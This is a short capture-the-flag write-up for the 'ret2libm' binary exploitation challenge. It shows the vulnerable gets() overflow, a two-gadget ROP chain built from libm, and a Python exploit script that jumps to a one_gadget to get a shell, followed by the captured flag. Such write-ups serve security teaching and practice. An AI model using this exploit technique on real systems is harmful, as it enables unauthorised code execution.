# ret2libm (Binary Exploitation)

This is a somewhat easy ROP challenge playing off `libm` instead of `libc`. libm is just the C math library, but it suprisingly lacks a lot of useful gadgets. The intended solution is just to somehow compute a useful rop chain with the gadgets in libm.

The challenge leaks the address of `fabs` in libm and then reads a buffer overflow with `gets`. All protections except stack cookies are enabled.
```c
    char yours[8];

    printf("Check out my pecs: %p\n", fabs);
    printf("How about yours? ");
    gets(yours);
    printf("Let's see how they stack up.");
```

My solution involved 2 gadgets:
- A standard `pop rax; ret` gadget
- An `add rax, rdx; jmp rax` gadget

At the end of the main(), it turns out the $RDX register already contains a libc pointer. We can just add the offset of a `one_gadget` there and get a shell.
```py
leak = r.recvuntil(b"\nHow").decode().split("\n")[-2].split(" ")[-1]
leak = eval(leak) - 0x31cf0
print(hex(leak)) # libm base

def p64(i):
    return i.to_bytes(8, byteorder="little")

ADDRAXRDXJUMPRAX = 0x000000000000f39f + leak
POPRAX_RET = 0x000000000001a3c8 + leak
OFFSET = 0x4f2a5 - 0x3ed8c0
OFFSET = OFFSET & (2**64 - 1)

rop = b"aaaabbbbccccdddd"
rop += p64(POPRAX_RET)
rop += p64(OFFSET)
rop += p64(ADDRAXRDXJUMPRAX)

r.sendline(rop)
r.sendline(b"cat /flag")
```

It appears that libm is actually at a constant offset from libc in practice, so the challenge could also be solved with a standard rop2libc.

```
irisctf{oh_its_ret2libc_anyway}
```
